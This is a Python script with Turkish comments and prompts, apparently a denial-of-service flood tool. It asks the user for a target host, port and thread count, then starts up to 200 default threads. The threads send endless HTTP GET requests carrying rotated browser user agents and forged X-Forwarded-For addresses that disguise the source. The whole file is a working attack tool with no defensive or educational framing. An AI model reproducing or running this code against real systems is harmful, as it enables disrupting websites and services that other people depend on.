#!/usr/bin/env python3

import socket
import threading
import time
import sys
import random
import requests
from datetime import datetime
from faker import Faker

# Varsayılan değerler
DEFAULT_THREADS = 200
DEFAULT_PORT = 80
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
]

def print_header():
    """DOS Semicolon"""
    print(r"""
  ____                  _               _             
 / ___|  ___  _ __ ___ (_) ___  _ __   (_) ___  _ __  
 \___ \ / _ \| '_ ` _ \| |/ _ \| '_ \  | |/ _ \| '_ \ 
  ___) | (_) | | | | | | | (_) | | | | | | (_) | | | |
 |____/ \___/|_| |_| |_|_|\___/|_| |_|_|_|\___/|_| |_|""")
    print("\n****************************************************************")
    print("\n****************************************************************")

def get_target_info():
    """Hedef IP veya alan adı, port ve thread sayısını kullanıcıdan al."""
    while True:
        target = input("\nLütfen hedef IP adresini veya alan adını girin (örneğin example.com veya 93.184.216.34): ").strip()
        if target:
            break
        print("Hedef alanı boş olamaz.")
    
    port = input("Lütfen hedef port numarasını girin (varsayılan 80, boş bırakabilirsiniz): ")
    port = int(port) if port.strip() else DEFAULT_PORT
    
    threads = input("Kaç thread kullanmak istiyorsunuz? (varsayılan 200, boş bırakabilirsiniz): ")
    threads = int(threads) if threads.strip() else DEFAULT_THREADS
    
    return target, port, threads

def resolve_target(target):
    """Hedefin IP adresini çöz."""
    try:
        return socket.gethostbyname(target)
    except socket.gaierror:
        print(f"Hedef {target} çözümlenemedi. Lütfen geçerli bir IP veya alan adı girin.")
        sys.exit(1)

def generate_headers():
    """Sahte HTTP başlıkları oluştur."""
    fake = Faker()
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "X-Forwarded-For": fake.ipv4(),  # Sahte IP adresi (IP spoofing simülasyonu)
    }
    return headers

def attack(target, port):
    """Hedefe sürekli HTTP istekleri gönder."""
    url = f"http://{target}:{port}/"
    while True:
        try:
            headers = generate_headers()
            response = requests.get(url, headers=headers, timeout=4)
            print(f"[+] Saldırı: {target}:{port} - İstek gönderildi ({threading.current_thread().name}) - Durum: {response.status_code}")
        except requests.exceptions.RequestException:
            print(f"[-] Bağlantı hatası: {target}:{port} ({threading.current_thread().name})")
        except Exception as e:
            print(f"[-] Hata: {str(e)} ({threading.current_thread().name})")
        time.sleep(random.uniform(0.1, 0.5))

def start_attack(target, port, num_threads):
    """Saldırıyı birden fazla thread ile başlat."""
    target_ip = resolve_target(target)
    print(f"\nHedef IP: {target_ip}")
    print(f"Saldırı başlatılıyor: {target}:{port} (Thread sayısı: {num_threads})")
    print(f"Başlangıç zamanı: {datetime.now()}")
    print("Çıkmak için Ctrl+C tuşlayın.")
    
    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target, port), name=f"Thread-{i}")
        thread.daemon = True
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

def main():
    print_header()
    target, port, num_threads = get_target_info()
    try:
        start_attack(target, port, num_threads)
    except KeyboardInterrupt:
        print("\nSaldırı durduruldu. Çıkılıyor...")
    except Exception as e:
        print(f"\nBeklenmedik bir hata oluştu: {str(e)}")

if __name__ == "__main__":
    main()
